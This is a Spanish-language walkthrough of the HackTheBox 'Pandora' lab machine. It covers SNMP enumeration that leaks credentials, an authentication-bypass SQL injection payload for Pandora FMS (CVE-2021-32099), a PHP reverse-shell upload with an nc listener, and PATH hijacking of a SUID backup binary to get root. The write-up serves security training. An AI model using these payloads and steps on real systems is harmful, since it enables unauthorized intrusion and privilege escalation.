# Máquina "Pandora" de HackTheBox

## Características

- Linux
- Fácil
- SNMP Fast Enumeration
- Information Leakage Local 
- Port Forwarding
- SQL Injection 
- Admin Session Hijacking
- PandoraFMS v7.0NG Authenticated
- Remote Code Execution [CVE-2019-20224] 
- Abusing Custom Binary 
- PATH Hijacking [Privilege Escalation]

## Útil en
- OSCP 
- eWPT

**IP:** 10.10.11.136

## Escaneo de puertos

### Escaneo inicial
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-18 19:51 UTC
Nmap scan report for 10.10.11.136
Host is up (0.092s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo detallado
```bash
sudo nmap -sCV -p22,80 10.10.11.136 -oN target
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-18 19:51 UTC
Nmap scan report for 10.10.11.136
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Buscamos el codename y es un **Ubuntu 20.04 focal**. También buscaremos los puertos UDP y como vemos el puerto 80, miraremos la IP en nuestro navegador. Vemos Apache HTTP Server y mientras revisamos la página notamos un dominio `panda.htb` que agregaremos al `/etc/hosts` para ver que el sitio no cambia con este dominio.

### Escaneo UDP
```bash
sudo nmap -sU --top-ports=100 panda.htb
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-18 20:10 UTC
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.089s latency).
Not shown: 99 closed ports
PORT    STATE SERVICE
161/udp open  snmp
```

Vemos el puerto **161**, que ejecuta un servicio SNMP. SNMP es un servicio que permite el monitoreo de la red. Usaremos scripts de nmap para sacar más información de este puerto.

```bash
nmap -p 161 -sU -A -v 10.10.11.136
```

![Nmap Script 1](/secciones/posts/imagenes/pandora/nmapscript1.webp)
![Nmap Script 2](/secciones/posts/imagenes/pandora/nmapscript2.webp)

## Enumeración SNMP

Alternativamente podemos instalar `snmp-mibs-downloader`. Podemos realizar un recorrido SNMP contra el host para ver los datos.

```bash
sudo apt install snmp-mibs-downloader 
```

Una vez instalado, diríjase a su configuración SNMP en `/etc/snmp/snmp.conf` y comente la línea `mibs`. A continuación, podemos ejecutar `snmpbulkwalk`, que es más rápido que la herramienta tradicional `snmpwalk`.

```bash
snmpbulkwalk -Cr1000 -c public -v2c 10.129.238.192 . | tee -a snmp3
```

```
SNMPv2-MIB::sysDescr.0 = STRING: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (244685) 0:40:46.85
SNMPv2-MIB::sysContact.0 = STRING: Daniel
SNMPv2-MIB::sysName.0 = STRING: pandora
SNMPv2-MIB::sysLocation.0 = STRING: Mississippi
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

### Ordenar la salida SNMP 

```bash
grep -oP '::.*?\.' snmp3 | sort | uniq -c | sort -n
```

```
--snip--
201 ::hrSWRunID.
201 ::hrSWRunIndex.
201 ::hrSWRunName.
201 ::hrSWRunParameters.
201 ::hrSWRunPath.
201 ::hrSWRunPerfCPU.
201 ::hrSWRunPerfMem.
201 ::hrSWRunStatus.
201 ::hrSWRunType.
396 ::nsModuleModes.
396 ::nsModuleName.
396 ::nsModuleTimeout.
820 ::hrSWInstalledDate.
820 ::hrSWInstalledID.
820 ::hrSWInstalledIndex.
820 ::hrSWInstalledName.
820 ::hrSWInstalledType.
--snip--
```

Nos servirá `hrSWRun`. Esto nos permite mostrar los nombres SNMP en orden de recurrencia en la salida. Al usar grep para buscar `hrSWRun` y canalizarlo a less, podemos desplazarnos por la salida. O podemos presionar repetidamente 'd' para saltar media página. Finalmente, encontramos `hrSWRunParameters` que tiene información interesante. Vemos que el usuario daniel está ejecutando un script llamado `host_check` y dejó sus credenciales.

```bash
grep hrSWRun snmp3 | less 
```

```
--snip--
HOST-RESOURCES-MIB::hrSWRunParameters.963 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.972 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.974 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.975 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.976 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
HOST-RESOURCES-MIB::hrSWRunParameters.978 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1011 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.1027 = STRING: "-k start"
--snip--
```

## Acceso inicial

Probamos las credenciales en SSH e ingresamos:

```bash
ssh daniel@10.10.11.136
# Password: HotelBabylon23
```

Una vez adentro, desafortunadamente parece que daniel no tiene nada en su directorio personal, pero en home vemos el directorio matt que en su home tiene la flag de usuario, así que buscaremos la forma de escalar privilegios. Usaremos linpeas mandando el script desde nuestra máquina atacante.

```bash
# En la máquina atacante
python3 -m http.server 8000

# Desde la víctima
wget http://10.10.14.18:8000/linpeas.sh
mv linpeas.sh /dev/shm
cd /dev/shm
chmod +x linpeas.sh
./linpeas.sh | tee lin.log
```

## Enumeración web local

También en paralelo revisaremos las configuraciones del sitio Apache que están en `/etc/apache2/sites-enabled`. En este caso son dos: 

- 000-default.conf  
- pandora.conf

`000-default.conf` parece un servidor web estándar, escucha en 80 y aloja fuera de `/var/www/html`.

```bash
cat pandora.conf | grep -Pv "^\s*#" | grep .
```

Solo escucha en localhost y bajo el nombre del servidor `pandora.panda.htb`. Está alojado fuera de `/var/www/pandora`, y funcionando como matt. Matt es dueño de la carpeta pandora, pero cualquier usuario puede navegar hasta ella y leer:

```bash
daniel@pandora:/var/www$ ls -l
total 8
drwxr-xr-x 3 root root 4096 Dec  7 14:32 html
drwxr-xr-x 3 matt matt 4096 Dec  7 14:32 pandora
```

No hay lugares escribibles por daniel en pandora:

```bash
daniel@pandora:/var/www$ find pandora/ -writable
```

Mientras agregamos `pandora.panda.htb` al `/etc/hosts`, sabemos que tenemos una aplicación web oculta escuchando en localhost en el puerto 80. Volvemos a la salida de linpeas y en uno de los binary processes permissions vemos `/usr/bin/host_check`. Así que intentamos ejecutarlo como usuario y contraseña de 'daniel'. Como no finalizó, usamos Ctrl + C y en la salida vemos:

**Pandora FMS versión 7.0 NG.742_FIX_PERL202**

Pandora FMS es un software de código abierto para monitorear redes e infraestructura de TI. Puede monitorear el estado y el rendimiento de los equipos de red, los sistemas operativos, la infraestructura virtual y todos los diferentes tipos de aplicaciones y sistemas sensibles a la seguridad, como firewalls, bases de datos y servidores web. Muchos líderes de la industria utilizan su edición empresarial, por ejemplo, AON, Allianz y Toshiba.

## Port Forwarding

El servidor Pandora suele utilizar el puerto 80 en la máquina localhost (127.0.0.1). Para acceder a ese host necesitamos reenviar el puerto 80 en el destino a nuestro host en un puerto diferente. Esto se puede hacer a través de SSH emitiendo el siguiente comando:

```bash
ssh -L 80:127.0.0.1:80 daniel@10.10.11.136
```

Establecemos `pandora.panda.htb 127.0.0.1` en mi `/etc/hosts`. Ahora, si accedemos a `pandora.panda.htb:80` en nuestra máquina atacante, el tráfico se reenviará desde el puerto 80 desde la máquina de destino.

![Pandora Interface](/secciones/posts/imagenes/pandora/pandora1.webp)

## Explotación

Continuamos buscando algún exploit para la versión de pandora que encontramos:

```bash
searchsploit pandora
```

Y encontramos:

- SQL Injection (pre authentication) (CVE-2021-32099)
- Phar deserialization (pre authentication) (CVE-2021-32098)
- Remote File Inclusion (lowest privileged user) (CVE-2021-32100)
- Cross-Site Request Forgery (CSRF)

Así que buscamos el CVE de inyección SQL: https://github.com/ibnuuby/CVE-2021-32099

### CVE-2021-32099

**POC:**
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

Esta inyección de SQL está presente porque la declaración SQL no utiliza declaraciones preparadas, como puede ver a continuación. Normalmente, utilizaría un signo de interrogación en lugar de los parámetros.

Nos centramos en una grave vulnerabilidad de inyección SQL. Puede explotarse de forma remota sin ningún privilegio de acceso y permite a un atacante eludir por completo la autenticación del administrador. Esto permite al final ejecutar código arbitrario en el sistema.

Volviendo a https://github.com/ibnuuby/CVE-2021-32099

Vemos que está codificado en URL, usamos URL encoder para decodificarlo:

**Entrada:**
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

**Salida:**
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
```

## Reverse Shell

Luego de eso vamos a la sección "Upload file administrator archives" en admin tools y cargamos una reverse shell. Usaremos:

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![PHP Shell](/secciones/posts/imagenes/pandora/shellphp.webp)

Abrimos una consola con nc en el puerto que introducimos:

```bash
sudo nc -nlvp [puerto]
```

```bash
mkdir .ssh
chmod 700 .ssh
cd .ssh
touch authorized_keys
```

Y le damos permisos 600:

```bash
chmod 600 authorized_keys
```

Luego copiamos el archivo `id_rsa.pub` y lo pegamos dentro de `authorized_keys`. Nos conectamos desde nuestra máquina al usuario matt:

```bash
ssh matt@[ip]
```

## Escalada de privilegios

Una vez dentro tenemos la flag de usuario y procederemos a buscar archivos con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

Vemos `/usr/bin/pandora_backup`. Podemos ver qué intenta hacer con ltrace y notaremos que system llama a tar sin una ruta completa.

`pandora_backup` tiene permiso ejecutable otorgado al usuario matt. Este binario se puede utilizar en la escalada de privilegios o Path Hijacking, si los comandos de Linux utilizados dentro de este binario no se utilizan con su ruta absoluta. Comprobemos si está utilizando algún comando de Linux sin su ruta absoluta.

```bash
cat /usr/bin/pandora_backup 
```

![Backup Binary](/secciones/posts/imagenes/pandora/backup1.png)

Se puede apreciar que está usando el binario `tar` para comprimir el archivo. Podemos usarlo para tener nuestra escalada a root. Pondremos una shell en la ruta de tar:

```bash
matt@pandora:~$ echo "/bin/bash" > /tmp/tar
matt@pandora:~$ chmod +x /tmp/tar
matt@pandora:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:~$ export PATH=/tmp:$PATH
matt@pandora:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:~$ /usr/bin/pandora_backup
```

Con esto ya seríamos root, así que buscamos la flag y terminamos.

---

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También si encuentra faltas de ortografía o cualquier error, puedes contactarme a mi correo.